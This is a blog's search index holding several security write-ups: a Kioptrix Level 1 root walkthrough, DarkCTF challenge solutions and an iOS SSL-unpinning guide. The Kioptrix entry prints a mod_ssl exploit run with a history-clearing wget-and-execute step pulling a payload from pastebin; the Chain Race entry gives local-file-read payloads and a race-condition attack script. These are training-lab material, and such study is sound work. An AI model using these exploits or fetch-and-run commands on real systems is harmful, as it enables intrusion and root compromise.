@@ -1,0 +1,399 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Kioptrix Level 1 Writeup</title>
+      <link href="Writeups/Kioptrix-Level-1/"/>
+      <url>Writeups/Kioptrix-Level-1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix: Level 1"></a>Kioptrix: Level 1</h1><p>Kioptrix series consists of 5 vulnerable machines. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p><h2 id="Get-VM’s-IP"><a href="#Get-VM’s-IP" class="headerlink" title="Get VM’s IP"></a>Get VM’s IP</h2><blockquote><p>Nmap -sn 192.168.1.1/24</p></blockquote><p>Find the Kioptrix Vm IP address using the -sn(Ping Scan) flag.</p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><ul><li>-p- –&gt; to scan ports from 1 through 65535</li><li>-sV –&gt; Version detection</li><li>-sC –&gt; script scan using the default set of scripts =&gt; equivalent to –script=default</li><li>-A –&gt; Aggressive scan options</li><li>–min-rate 1000 –&gt; 1000 packets per second</li><li>–max-retries 5 –&gt; number of times a packet is to be resent on a port to check</li></ul><pre><code>nmap -p- -sV -sC -A --min-rate 1000 --max-retries 5 192.168.1.104Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-04 16:40 EDTStats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 1.08% done; ETC: 16:44 (0:03:02 remaining)Nmap scan report for 192.168.1.104Host is up (0.0022s latency).Not shown: 65529 filtered portsPORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)| ssh-hostkey: |   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)|_sshv1: Server supports SSHv180/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-title: Test Page for the Apache Web Server on Red Hat Linux111/tcp  open  rpcbind     2 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2            111/tcp   rpcbind|   100000  2            111/udp   rpcbind|   100024  1           1024/tcp   status|_  100024  1           1024/udp   status139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-title: 400 Bad Request| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--| Not valid before: 2009-09-26T09:32:06|_Not valid after:  2010-09-26T09:32:06|_ssl-date: 2021-06-04T20:45:41+00:00; +1m55s from scanner time.| sslv2: |   SSLv2 supported|   ciphers: |     SSL2_RC2_128_CBC_WITH_MD5|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5|     SSL2_DES_64_CBC_WITH_MD5|     SSL2_RC4_128_EXPORT40_WITH_MD5|     SSL2_RC4_128_WITH_MD5|     SSL2_RC4_64_WITH_MD5|_    SSL2_DES_192_EDE3_CBC_WITH_MD51024/tcp open  status      1 (RPC #100024)Host script results:|_clock-skew: 1m54s|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)|_smb2-time: Protocol negotiation failed (SMB2)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 182.00 seconds</code></pre><p>That’s a lot of outdated services, Lets start with web service.</p><h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><pre><code>nikto -h 192.168.1.104 - Nikto v2.1.6---------------------------------------------------------------------------+ Target IP:          192.168.1.104+ Target Hostname:    192.168.1.104+ Target Port:        80+ Start Time:         2021-06-05 14:45:52 (GMT-4)---------------------------------------------------------------------------+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).+ OSVDB-3268: /manual/: Directory indexing found.+ OSVDB-3092: /manual/: Web server manual found.+ OSVDB-3268: /icons/: Directory indexing found.+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response+ Scan terminated:  20 error(s) and 19 item(s) reported on remote host+ End Time:           2021-06-05 14:52:46 (GMT-4) (414 seconds)---------------------------------------------------------------------------+ 1 host(s) tested</code></pre><p>From the nikto scan, </p><blockquote><p>mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082</a>, OSVDB-756.</p></blockquote><p>CVE-2002-0082 is interesting which provides remote shell.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>By searching CVE-2002-0082, exploit-db have a exploit for this CVE - <a href="https://www.exploit-db.com/exploits/47080">click here</a>.</p><p>Compile the c code as below,</p><blockquote><p>gcc -o mod-ssl 47080.c  -lcrypto </p></blockquote><ul><li>0x6b - Redhat Linux 7.2(Found from nmap scan)</li></ul><pre><code>./mod-ssl 0x6b 192.168.1.104 443 -c 41******************************************************************** OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open ********************************************************************* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE ** #hackarena  irc.brasnet.org                                     ** TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname ** #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam ** #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ ********************************************************************Connection... 41 of 41Establishing SSL connectioncipher: 0x4043808c   ciphers: 0x80f8070Ready to send shellcodeSpawning shell...bash: no job control in this shellbash-2.05$ bash-2.05$ unset HISTFILE; cd /tmp; wget https://pastebin.com/raw/C7v25Xr9 -Orace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; --16:16:49--  https://pastebin.com/raw/C7v25Xr9           =&gt; `ptrace-kmod.c'Connecting to pastebin.com:443... connected!HTTP request sent, awaiting response... 200 OKLength: unspecified [text/plain]    0K ...                                                    @ 655.27 KB/s16:16:49 (655.27 KB/s) - `ptrace-kmod.c' saved [4026]ptrace-kmod.c:183:1: warning: no newline at end of file/usr/bin/ld: cannot open output file p: Permission deniedcollect2: ld returned 1 exit statuswhoamiroothostnamekioptrix.level1</code></pre><p>A shell with root access.</p><h3 id="TIP"><a href="#TIP" class="headerlink" title="TIP"></a>TIP</h3><p>For the above exploit to work, Both kali and Kioptrix should be in bridged network If you are hosting in Vmware.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a><br><a href="https://www.exploit-db.com/exploits/47080">https://www.exploit-db.com/exploits/47080</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeups </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> OSCP </tag>
+            
+            <tag> Notes </tag>
+            
+            <tag> VulnHub </tag>
+            
+            <tag> Writeups </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>UWTSD: Guest Lecture on CTF</title>
+      <link href="Presentation/UWTSD-Guest-Lecture-on-CTF/"/>
+      <url>Presentation/UWTSD-Guest-Lecture-on-CTF/</url>
+      
+        <content type="html"><![CDATA[<p>I was given an opportunity to guest lecture at the University of Wales Trinity Saint David on 5th Nov 2020, sharing some ideas with students studying Cyber Security on “CTF(aka Capture the Flag) - Learn, Play &amp; Fun”. Mainly the topic is about online cyber activities to increase cyber skills regularly with fun(that’s CTF). </p><p><img src="/medias/presentation/uwtsd/teamspresentation.png" alt="Presentation"></p><p>I was so happy with how it turned out and few questions from the students are great, I may have spoken a little quick in sections, but all in all I think it was a success. I even got a compliment from a student after which is a good sign!<br><img src="/medias/presentation/uwtsd/expgif.gif" alt="Emotion"></p><h3 id="Credit"><a href="#Credit" class="headerlink" title="Credit:"></a>Credit:</h3><p>Thank you so much <strong>Nitheesh Murugan Kaliyamurthy</strong> (Lecturer at UWTSD) for giving me the opportunity and without your support this wouldn’t be possible.<br>LiveOverFlow - keeps me motivated.</p><h3 id="Slide-link"><a href="#Slide-link" class="headerlink" title="Slide link:"></a>Slide link:</h3><pre class=" language-link"><code class="language-link">https://drive.google.com/file/d/1BP-PNC5-_1K2Fh-4VMpj3T1pWoFv-mAM/view?usp=sharing</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Presentation </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Presentation </tag>
+            
+            <tag> Guest Lecture </tag>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>DarkCTF Official Writeup - Chain Race</title>
+      <link href="Writeups/darkctf-official-chain-race/"/>
+      <url>Writeups/darkctf-official-chain-race/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Chain-Race"><a href="#Chain-Race" class="headerlink" title="Chain Race"></a>Chain Race</h1><blockquote><p>Points: <code>472</code><br>Category: WEB<br>Author: Catamob,Z3phyr</p></blockquote><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote><p>web<br>All files are included. Source code is the key.<br><a href="http://race.darkarmy.xyz:8999/">http://race.darkarmy.xyz:8999</a></p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>The Challenge link webpage looks like this,</p><p><img src="/medias/writeups/darkctf/chainrace1.png" alt="chainrace 1"></p><p>The working of the website is to provide the content as output with URL as an input. To exploit this, we need to understand the working. As below, localhost:80 gives the HTML content of the webpage, and it uses a post parameter called handler in <code>testhook.php</code>.</p><p><img src="/medias/writeups/darkctf/chainrace2.png" alt="chainrace 2"></p><p>From the above response, localhost is not restricted and also PHP as backend. So, File inclusion is also possible with the payload <code>file:///etc/passwd</code>. From here, <code>testhook.php</code> file also can be extracted by trying with default path <code>file:///var/www/html/testhook.php</code> for full understanding.</p><p><img src="/medias/writeups/darkctf/chainrace3.png" alt="chainrace 3"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token comment" spellcheck="true">// create curl resource </span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// set url </span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"handler"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//return the transfer as a string </span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// $output contains the output string </span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// close curl resource to free up system resources </span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>PS: Here in the last line we gave the hint as     <code>localhost8080:x:5:60:darksecret-hiddenhere:/usr/games/another-server:/usr/sbin/nologin</code>. This shows localhost8080 is hosted, but this port can’t be accessed outside. So using the working of the website, we can exploit further.</p><h3 id="Without-a-Hint"><a href="#Without-a-Hint" class="headerlink" title="Without a Hint"></a>Without a Hint</h3><p>From the HTTP response <code>Server: Apache/2.4.18 (Ubuntu)</code>, it shows server is hosted in apache. By Enumerating the apache default config file like <code>file:///etc/apache2/sites-available/000-default.conf</code> and <code>file:///etc/apache2/ports.conf</code> will show you another server is hosted in 8080 port internally.</p><pre><code>file:///etc/apache2/sites-available/000-default.conf# If you just change the port or add more ports here, you will likely also# have to change the VirtualHost statement in# /etc/apache2/sites-enabled/000-default.confListen 80Listen 8080&lt;IfModule ssl_module&gt;    Listen 443&lt;/IfModule&gt;&lt;IfModule mod_gnutls.c&gt;    Listen 443&lt;/IfModule&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><pre><code>file:///etc/apache2/ports.conf&lt;VirtualHost *:80&gt;    # The ServerName directive sets the request scheme, hostname and port that    # the server uses to identify itself. This is used when creating    # redirection URLs. In the context of virtual hosts, the ServerName    # specifies what hostname must appear in the request's Host: header to    # match this virtual host. For the default virtual host (this file) this    # value is not decisive as it is used as a last resort host regardless.    # However, you must set it for any further virtual host explicitly.    #ServerName www.example.com    ServerAdmin webmaster@localhost    DocumentRoot /var/www/html    # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,    # error, crit, alert, emerg.    # It is also possible to configure the loglevel for particular    # modules, e.g.    #LogLevel info ssl:warn    ErrorLog ${APACHE_LOG_DIR}/error.log    CustomLog ${APACHE_LOG_DIR}/access.log combined    # For most configuration files from conf-available/, which are    # enabled or disabled at a global level, it is possible to    # include a line for only one particular virtual host. For example the    # following line enables the CGI configuration for this host only    # after it has been globally disabled with "a2disconf".    #Include conf-available/serve-cgi-bin.conf&lt;/VirtualHost&gt;&lt;VirtualHost *:8080&gt;    ServerAdmin webmaster@localhost        DocumentRoot /var/www/html1    ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><p>By accessing localhost:8080 will give the PHP file.</p><h3 id="PHP-string-Bypass"><a href="#PHP-string-Bypass" class="headerlink" title="PHP string Bypass"></a>PHP string Bypass</h3><p>In the given index.php, you can see some string operations. It checks for query params <code>user</code> and <code>secret</code> is set.</p><pre><code>if(!(isset($_GET['user']) &amp;&amp; isset($_GET['secret']))){    highlight_file("index.php");    die();}The program dies with nope when we encounter these checks to be trueif (($_GET['secret'] == "0x1337") || $_GET['user'] == "admin") {    die("nope");}</code></pre><p>In the first check, the user string is compared with compared with “admin” using strcmp which returns 0 when equal.</p><pre><code>$login_1 = strcmp($_GET['user'], "admin") ? 1 : 0;</code></pre><p>the next check is using strcasecmp which performs a byte-by-byte comparison on two strings.</p><pre><code>if (strcasecmp($_GET['secret'], "0x1337") == 0){    $login_2 = 1;}</code></pre><p>so the vulnerability is on the kind of compares the each api does. <code>strcmp</code> can be bypassed when the string is greater than the compared string so that <code>login_1</code> becomes one. <code>strcasecmp</code> can be bypassed when the string is an array which essentially returns false which is equal to zero setting <code>login_2</code> true </p><p><img src="/medias/writeups/darkctf/chainrace4.png" alt="chainrace 4"></p><p>To Bypass unlink, Need to exploit using race condition. For that we need <code>turbo intruder</code> or <code>python script</code>.</p><h3 id="Turbo-Intruder"><a href="#Turbo-Intruder" class="headerlink" title="Turbo Intruder"></a>Turbo Intruder</h3><p>Generate a word list with 1 to 10000 for continuous hit and use the default script in intruder by providing the generated word list as input. And in <code>handleresponse</code> <code>if dark in req.response</code> will give you the filtered output.</p><p><img src="/medias/writeups/darkctf/chainrace5.png" alt="chainrace 5"></p><p>Execute the turbo intruder will give you the below flag.</p><p><img src="/medias/writeups/darkctf/chainrace6.png" alt="chainrace 6"></p><h3 id="Python-Script"><a href="#Python-Script" class="headerlink" title="Python Script"></a>Python Script</h3><p>This below python script will also give you the answer.</p><pre><code>import threadingimport requestsfor i in range(0x200):    def login():        s= {'handler':'http://127.0.0.1:8080/index.php?user=admin1212&amp;secret[]'}        url="http://race.darkarmy.xyz:8999/testhook.php"        r=requests.post(url,data=s)        if "darkCTF{" in r.content:            print r.content            exit(0)    threading.Thread(target=login).start()</code></pre><h3 id="Sanity-Checks"><a href="#Sanity-Checks" class="headerlink" title="Sanity Checks"></a>Sanity Checks</h3><ul><li>Usage of <code>===</code> instead of <code>==</code> </li><li><code>strncasecmp</code> instead of <code>strcasecmp</code> which essentially compares n bytes </li><li>usage of <code>file_exists</code> api before file operations</li></ul><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote><p>darkCTF{9h9_15_50_a3fu1}</p></blockquote><h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><p>Z3phyr - <code>https://github.com/GiridharPrasath/ctf/tree/master/darkctf/web</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeups </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Writeups </tag>
+            
+            <tag> DarkCTF </tag>
+            
+            <tag> DarkArmy </tag>
+            
+            <tag> Web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>DarkCTF Official Writeup - Dark Social Web</title>
+      <link href="Writeups/darkctf-official-dark-social-web/"/>
+      <url>Writeups/darkctf-official-dark-social-web/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Dark-Social-Web"><a href="#Dark-Social-Web" class="headerlink" title="Dark Social Web"></a>Dark Social Web</h1><blockquote><p>Points: <code>472</code></p></blockquote><blockquote><p>Author: <code>Catamob, Whitewolf</code></p></blockquote><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote><p>0xDarkArmy has 1 social account, and DarkArmy uses the same name everywhere. Hint: The front page of internet<br>Hint: the front page of the internet<br>flag format: darkctf{}</p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We already have accounts on Twitter and Instagram with the same username for a long time. But we didn’t advertise Reddit and the one community with r/0xDarkArmy and user account with u/0xDarkArmy.</p><p>People who don’t know our Reddit account can be found from the hint that the Reddit’s slogan is “The Front page of the internet”.</p><p>Alternative:<br><a href="https://github.com/sherlock-project/sherlock">https://github.com/sherlock-project/sherlock</a></p><pre class=" language-python"><code class="language-python">python3 sherlock 0xDarkArmy</code></pre><p>Sherlock will give you the intended result of social media accounts.</p><p>In r/0xDarkArmy, there is a pinned post as below, </p><p><img src="/medias/writeups/darkctf/social1.png" alt="Social 1"></p><p>0xDarkArmy’s comment saying DarkSecret in the profile, One post in u/0xDarkArmy says spoiler contains and it contains the QR code to a .onion website.</p><p><img src="/medias/writeups/darkctf/social2.png" alt="Social 2"></p><p>Tor is needed for opening .onion sites, in that 1st part of the flag is in robots.txt and 2nd part of the flag is in the request body as flag header,</p><p><img src="/medias/writeups/darkctf/social3.png" alt="Social 2"></p><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote><p>darkctf{S0c1a1_D04k_w3b_051n7}</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeups </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Writeups </tag>
+            
+            <tag> DarkCTF </tag>
+            
+            <tag> DarkArmy </tag>
+            
+            <tag> Osint </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>DarkCTF Official Writeup - Secret of the Contract</title>
+      <link href="Writeups/darkctf-official-secret-contract/"/>
+      <url>Writeups/darkctf-official-secret-contract/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Secret-Of-The-Contract"><a href="#Secret-Of-The-Contract" class="headerlink" title="Secret Of The Contract"></a>Secret Of The Contract</h1><blockquote><p>Points: <code>465</code></p></blockquote><blockquote><p>Author: <code>Catamob, RDxR10</code></p></blockquote><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote><p>Ropsten network contains my dark secret. Help us find it. Name of the contract was 0x6e5EA18371748Db7F12A70037d647cDFCf458e45</p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>From the Description, One of the Etherum’s blockchain public network is Ropsten Network.</p><p>As its a Ropsten network, <a href="https://ropsten.etherscan.io/">TESTNET Ropsten (ETH) Blockchain Explorer</a> this website reads the public information from the ethereum. By searching <code>0x6e5EA18371748Db7F12A70037d647cDFCf458e45</code> this contract id will give the history of transaction associated with the contract as below.</p><p><img src="/medias/writeups/darkctf/contract1.png" alt="Contract 1"></p><p>By checking the state of the 1st transaction will give you the 1st part of the flag.</p><p><img src="/medias/writeups/darkctf/contract2.png" alt="Contract 2"></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'3772346e3534633731306e7d'</span><span class="token punctuation">)</span>b<span class="token string">'7r4n54c710n}'</span></code></pre><p>By checking the 2nd part of the transaction(which is the deploy transaction) in the state change will give you the second part.</p><p><img src="/medias/writeups/darkctf/contract3.png" alt="Contract 3"></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'6461726B4354467B337468337233756D5F353730723467335F'</span><span class="token punctuation">)</span>b<span class="token string">'darkCTF{3th3r3um_570r4g3_'</span></code></pre><p>Therefore, Combining both will give you the flag.</p><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote><p>darkCTF{3th3r3um_570r4g3_7r4n54c710n}</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeups </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Writeups </tag>
+            
+            <tag> DarkCTF </tag>
+            
+            <tag> DarkArmy </tag>
+            
+            <tag> blockchain </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IOS SSL UNPINNING USING SSL-Kill-Switch2</title>
+      <link href="Ios/iso-ssl-bypass/"/>
+      <url>Ios/iso-ssl-bypass/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Why-SSL-pinning"><a href="#Why-SSL-pinning" class="headerlink" title="Why SSL pinning?"></a>Why SSL pinning?</h3><p>SSL Pinning is where you ignore that whole thing, and say trust this certificate only or perhaps trust only certificates which are signed by this CA. </p><h3 id="Ways-to-bypass-Ios-ssl-verification-certificate-pinning"><a href="#Ways-to-bypass-Ios-ssl-verification-certificate-pinning" class="headerlink" title="Ways to bypass Ios ssl verification certificate pinning"></a>Ways to bypass Ios ssl verification certificate pinning</h3><ol><li>Installing your own CA</li><li>Installing Software to iOS Device</li><li>Using Objection and Frida</li><li>Using disassemblers to modify IPA file</li></ol><h2 id="Method-used"><a href="#Method-used" class="headerlink" title="Method used"></a>Method used</h2><p>This method requires jailbroken device and it should be less than ios version 12 for ssl-kill-switch2 to work. To jailbreak the device, Electra is used. </p><h3 id="Jailbreak"><a href="#Jailbreak" class="headerlink" title="Jailbreak"></a>Jailbreak</h3><p>Install Hydra, using Cydia Impactor and click <code>jailbreak</code> button. After jailbreak is done, Cydia application will be installed. Make sure SSH connection is proper.</p><p><img src="/medias/projects/ios-ssl/cydia.PNG" alt="cydia"></p><h3 id="Dependencies"><a href="#Dependencies" class="headerlink" title="Dependencies"></a>Dependencies</h3><p>Make sure to install following packages.</p><ol><li>Debian Packager</li><li>Cydia Substrate</li><li>PreferenceLoader</li></ol><p><img src="/medias/projects/ios-ssl/dep.PNG" alt="dep install"></p><h3 id="SSL-Kill-Switch2"><a href="#SSL-Kill-Switch2" class="headerlink" title="SSL-Kill-Switch2"></a>SSL-Kill-Switch2</h3><p>Transfer the application to iphone using any method and use below commands to make that work.</p><pre><code>$dpkg -i &lt;package&gt;.deb$killall -HUP SpringBoard</code></pre><p>dpkg is used to install the package and another command is to restart that.</p><p>Finally, enable ssl-kill-switch2 in settings.</p><p><img src="/medias/projects/ios-ssl/app-on.PNG" alt="ssl on"></p><p>Note: Unpinning happens in the runtime. So, No need to mention specific application. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://github.com/nabla-c0d3/ssl-kill-switch2</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Ios </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Mobile </tag>
+            
+            <tag> Bypass </tag>
+            
+            <tag> Frida </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SSL UNPINNING USING XPOSED MODULE</title>
+      <link href="Android/ssl-pin-bypass/"/>
+      <url>Android/ssl-pin-bypass/</url>
+      
